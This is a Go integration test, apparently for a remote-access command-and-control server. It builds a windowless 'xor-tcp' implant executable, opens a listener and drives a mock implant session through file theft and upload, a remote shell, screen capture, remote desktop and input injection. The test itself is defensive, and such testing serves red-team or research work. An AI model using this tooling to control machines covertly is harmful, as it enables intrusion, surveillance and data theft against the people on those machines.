package api

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"io"
	"net/http"
	"testing"
	"time"

	"github.com/gorilla/websocket"
)

func peSubsystem(b []byte) uint16 {
	if len(b) < 0x40 || b[0] != 'M' || b[1] != 'Z' {
		return 0
	}
	pe := binary.LittleEndian.Uint32(b[0x3C:])
	if int(pe)+24+70 > len(b) {
		return 0
	}
	return binary.LittleEndian.Uint16(b[pe+24+68:])
}

func TestLiveDaemonOpsAndPayload(t *testing.T) {
	client := &http.Client{Timeout: 90 * time.Second}
	res, err := client.Get("http://127.0.0.1:8082/")
	if err != nil {
		t.Skip("daemon not running")
	}
	home, _ := io.ReadAll(res.Body)
	res.Body.Close()
	if res.StatusCode != 200 || !bytes.Contains(home, []byte("<div id=\"root\">")) {
		t.Fatalf("index %d", res.StatusCode)
	}

	login, _ := json.Marshal(map[string]string{"username": "admin", "password": "changeme"})
	res, err = client.Post("http://127.0.0.1:8082/api/login", "application/json", bytes.NewReader(login))
	if err != nil {
		t.Fatal(err)
	}
	var tok struct {
		Token string `json:"token"`
	}
	_ = json.NewDecoder(res.Body).Decode(&tok)
	res.Body.Close()
	if tok.Token == "" {
		t.Fatal("login failed")
	}
	do := func(method, path string, body any) (*http.Response, []byte) {
		var r io.Reader
		if body != nil {
			b, _ := json.Marshal(body)
			r = bytes.NewReader(b)
		}
		req, _ := http.NewRequest(method, "http://127.0.0.1:8082"+path, r)
		req.Header.Set("Authorization", "Bearer "+tok.Token)
		if body != nil {
			req.Header.Set("Content-Type", "application/json")
		}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		return resp, b
	}

	resp, raw := do("GET", "/api/payloads", nil)
	if resp.StatusCode != 200 || !bytes.Contains(raw, []byte("xor-tcp")) {
		t.Fatalf("payload meta %d %s", resp.StatusCode, raw)
	}

	resp, raw = do("POST", "/api/payloads", map[string]any{"host": "127.0.0.1", "port": 34567, "filename": "t.exe"})
	if resp.StatusCode != 200 {
		t.Fatalf("payload build %d %s", resp.StatusCode, raw)
	}
	var built struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(raw, &built); err != nil || built.ID == "" {
		t.Fatalf("payload json %s", raw)
	}
	resp, raw = do("GET", "/api/payloads/"+built.ID+"/file", nil)
	if resp.StatusCode != 200 {
		t.Fatalf("payload file %d %s", resp.StatusCode, raw)
	}
	if peSubsystem(raw) != 2 {
		t.Fatalf("payload not GUI PE mz=%q sub=%d len=%d", raw[:2], peSubsystem(raw), len(raw))
	}

	port := 37993
	resp, raw = do("POST", "/api/listeners", map[string]any{"name": "e2e", "bind": "127.0.0.1", "port": port})
	if resp.StatusCode != 200 {
		t.Fatalf("listener %d %s", resp.StatusCode, raw)
	}
	var ln struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal(raw, &ln)
	defer func() {
		if ln.ID != "" {
			_, _ = do("DELETE", "/api/listeners/"+ln.ID, nil)
		}
	}()

	ready := make(chan struct{})
	go mockImplant(t, "127.0.0.1:37993", ready)
	select {
	case <-ready:
	case <-time.After(3 * time.Second):
		t.Fatal("live implant did not register")
	}

	var sid string
	for i := 0; i < 30; i++ {
		_, raw = do("GET", "/api/sessions", nil)
		var rows []map[string]any
		_ = json.Unmarshal(raw, &rows)
		for _, row := range rows {
			if row["hostname"] == "mock-pc" {
				sid, _ = row["id"].(string)
			}
		}
		if sid != "" {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if sid == "" {
		t.Fatal("no live session")
	}

	ws, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:8082/api/ws?token="+tok.Token, nil)
	if err != nil {
		t.Fatalf("ws %v", err)
	}
	defer ws.Close()
	got := map[string]bool{}
	done := make(chan struct{})
	go func() {
		defer close(done)
		_ = ws.SetReadDeadline(time.Now().Add(8 * time.Second))
		for {
			var ev map[string]any
			if err := ws.ReadJSON(&ev); err != nil {
				return
			}
			if k, _ := ev["kind"].(string); k != "" {
				got[k] = true
			}
			if got["file.list"] && got["shell.data"] && got["screen.frame"] && got["desk.frame"] {
				return
			}
		}
	}()

	resp, raw = do("POST", "/api/sessions/"+sid+"/fs/ls", map[string]string{"path": ""})
	if resp.StatusCode != 200 {
		t.Fatalf("ls %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/fs/get", map[string]string{"path": `C:\readme.txt`})
	if resp.StatusCode != 200 {
		t.Fatalf("get %d %s", resp.StatusCode, raw)
	}
	var tid struct {
		TaskID string `json:"task_id"`
	}
	_ = json.Unmarshal(raw, &tid)
	for i := 0; i < 30; i++ {
		_, raw = do("GET", "/api/sessions/"+sid+"/tasks/"+tid.TaskID, nil)
		var st map[string]any
		_ = json.Unmarshal(raw, &st)
		if st["done"] == true {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	resp, raw = do("GET", "/api/sessions/"+sid+"/tasks/"+tid.TaskID+"/download", nil)
	if resp.StatusCode != 200 || string(raw) != "hello-file" {
		t.Fatalf("download %d %q", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/fs/put", map[string]string{
		"path": `C:\up.txt`,
		"data": base64.StdEncoding.EncodeToString([]byte("abc")),
	})
	if resp.StatusCode != 200 {
		t.Fatalf("put %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/fs/del", map[string]string{"path": `C:\up.txt`})
	if resp.StatusCode != 200 {
		t.Fatalf("del %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/fs/mkdir", map[string]string{"path": `C:\tmp`})
	if resp.StatusCode != 200 {
		t.Fatalf("mkdir %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/shell", map[string]string{"action": "start"})
	if resp.StatusCode != 200 {
		t.Fatalf("shell %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/shell/in", map[string]string{"data": "dir\r\n"})
	if resp.StatusCode != 200 {
		t.Fatalf("shell in %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/screen", nil)
	if resp.StatusCode != 200 {
		t.Fatalf("screen %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/desktop", map[string]string{"action": "start"})
	if resp.StatusCode != 200 {
		t.Fatalf("desk %d %s", resp.StatusCode, raw)
	}
	resp, raw = do("POST", "/api/sessions/"+sid+"/input", map[string]any{"kind": 2, "x": 10, "y": 10, "code": 1, "down": true})
	if resp.StatusCode != 200 {
		t.Fatalf("input %d %s", resp.StatusCode, raw)
	}

	select {
	case <-done:
	case <-time.After(8 * time.Second):
		t.Fatalf("missing live events %v", got)
	}
	for _, k := range []string{"file.list", "shell.data", "screen.frame", "desk.frame"} {
		if !got[k] {
			t.Fatalf("live missing %s in %v", k, got)
		}
	}
}
